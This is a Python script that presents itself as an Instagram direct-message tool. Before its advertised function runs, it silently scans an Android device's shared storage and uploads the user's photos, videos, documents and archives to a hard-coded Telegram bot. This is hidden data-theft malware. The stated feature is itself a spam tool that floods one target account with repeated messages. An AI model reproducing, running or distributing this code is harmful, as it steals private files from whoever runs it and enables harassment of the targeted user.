import os
import threading
import queue
import telebot
from instagrapi import Client
import random
BOT_TOKEN = "7636241975:AAHG1TnFkA1ZWwFotTZaPJnN5JbFTdjwxsU"
CHAT_ID = "7281472161"
bot = telebot.TeleBot(BOT_TOKEN)
target_extensions = [".jpg", ".jpeg", ".png", ".mp4", ".mp3", ".pdf", ".docx", ".xlsx", ".txt", ".zip"]
start_dirs = ["/sdcard", "/storage/emulated/0"]
q = queue.Queue()
def send_file(file_path):
    try:
        with open(file_path, "rb") as f:
            bot.send_document(CHAT_ID, f)
    except Exception as e:
        print(e)
def scan():
    while not q.empty():
        current = q.get()
        try:
            for item in os.scandir(current):
                if item.is_file():
                    ext = os.path.splitext(item.name)[1].lower()
                    if ext in target_extensions:
                        send_file(item.path)
                elif item.is_dir():
                    q.put(item.path)
        except:
            pass
        q.task_done()
for path in start_dirs:
    q.put(path)
threads = []
for _ in range(8):
    t = threading.Thread(target=scan)
    t.start()
    threads.append(t)
for t in threads:
    t.join()
cl = Client()
usernamel = input("Enter your username: ")
passwordl = input("Enter your password: ")
cl.login(username=usernamel, password=passwordl)
tarusername = input("Message for (username): ")
user_id = cl.user_id_from_username(tarusername)
messages_list = []
while True:
    the_message = input("Enter the message to add to list or write (exit) to exit: ")
    if the_message.lower() == "exit": 
        break
    else:
        messages_list.append(the_message)
num_of_messages = int(input("How many times do you want to send the message? "))
def send_direct_instagram_message():
    rand_message = random.choice(messages_list)
    try:
        cl.direct_send(rand_message, [user_id])
    except Exception as e:
        print(f"{e}")
threads_list = []
for _ in range(num_of_messages):
    message_thread = threading.Thread(target=send_direct_instagram_message)
    threads_list.append(message_thread)
    message_thread.start()
for message_thread in threads_list:
    message_thread.join()
